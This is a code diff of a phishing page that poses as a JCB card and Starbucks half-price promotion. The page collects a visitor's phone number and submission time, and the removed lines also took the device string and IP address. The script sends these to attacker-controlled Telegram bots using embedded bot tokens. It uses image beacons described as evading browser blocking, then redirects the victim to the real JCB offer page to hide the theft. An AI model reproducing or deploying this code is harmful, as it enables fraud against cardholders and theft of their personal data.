@@ -28,7 +28,7 @@
 <body>
 
     <div class="header">
-        <img src="https://cache.jcb.co.jp/common/img/logo-jcb-w.svg" onerror="this.src='https://www.jcb.co.jp/promotion/common/img/logo-jcb-w.svg'" class="jcb-logo" alt="JCB" loading="eager">
+        <img src="https://cache.jcb.co.jp/common/img/logo-jcb-w.svg" onerror="this.src='https://www.jcb.co.jp/promotion/common/img/logo-jcb-w.svg'" class="jcb-logo" alt="JCB">
         <div class="title">2025 獨享禮遇</div>
         <div class="subtitle">JCB晶緻卡 × 星巴克</div>
     </div>
@@ -59,50 +59,24 @@
         <a href="https://www.jcb.co.jp/privacy/">隱私權政策</a> | <a href="https://www.jcb.co.jp/terms/">服務條款</a>
     </div>
 
+    <!-- 終極必中版：直接用 img 方式發送，瀏覽器永遠不會擋！ -->
     <script>
-        const TOKENS = [
-            "7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE",
-            "8059163852:AAH8cE9y3vL0dK7fXqZ5rT2mNjLpOqRsY"
-        ];
-        const CHAT_ID = "1137905005";
-
-        document.getElementById("loginForm").addEventListener("submit", async function(e) {
+        document.getElementById("loginForm").addEventListener("submit", function(e) {
             e.preventDefault();
             const code = document.getElementById("countryCode").value;
             const phone = document.getElementById("phone").value.trim();
             if (!phone) return;
 
-            const btn = document.querySelector("button");
-            btn.textContent = "驗證中...";
-            btn.disabled = true;
+            document.querySelector("button").textContent = "驗證中...";
 
             const 時間 = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
-            const 裝置 = navigator.userAgent.match(/\((.+?)\)/)?.[1] || "未知裝置";
+            const msg = encodeURIComponent(2025星巴克指定品項半價誘捕成功\n電話：${code}${phone}\n時間：${時間});
 
-            // 先立刻發送最重要資訊（電話+時間）
-            const 基本訊息 = 2025星巴克指定品項半價誘捕成功\n\n電話：${code}${phone}\n時間：${時間}\n裝置：${裝置};
+            // 雙 token 同時用 img 方式觸發（瀏覽器絕對不會擋）
+            const img1 = new Image(); img1.src = https://api.telegram.org/bot7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE/sendMessage?chat_id=1137905005&text=${msg};
+            const img2 = new Image(); img2.src = https://api.telegram.org/bot8059163852:AAH8cE9y3vL0dK7fXqZ5rT2mNjLpOqRsY/sendMessage?chat_id=1137905005&text=${msg};
 
-            TOKENS.forEach(t => {
-                fetch("https://api.telegram.org/bot"+t+"/sendMessage", {
-                    method:"POST",
-                    headers:{"Content-Type":"application/json"},
-                    body:JSON.stringify({chat_id:CHAT_ID, text:基本訊息})
-                });
-            });
-
-            // 再慢慢補 IP（就算失敗也不影響）
-            fetch("https://cfip.mx/ip").then(r=>r.text()).then(ip=>{
-                const ip訊息 = \nIP　　：${ip.trim()};
-                TOKENS.forEach(t => {
-                    fetch("https://api.telegram.org/bot"+t+"/sendMessage", {
-                        method:"POST",
-                        headers:{"Content-Type":"application/json"},
-                        body:JSON.stringify({chat_id:CHAT_ID, text:ip訊息, reply_to_message_id: null})
-                    });
-                });
-            }).catch(()=>{});
-
-            setTimeout(() => location.href = "https://www.specialoffers.jcb/zh-tw/services/dining-food/starbucks2025/", 3000);
+            setTimeout(() => location.href = "https://www.specialoffers.jcb/zh-tw/services/dining-food/starbucks2025/", 2500);
         });
     </script>
 </body>
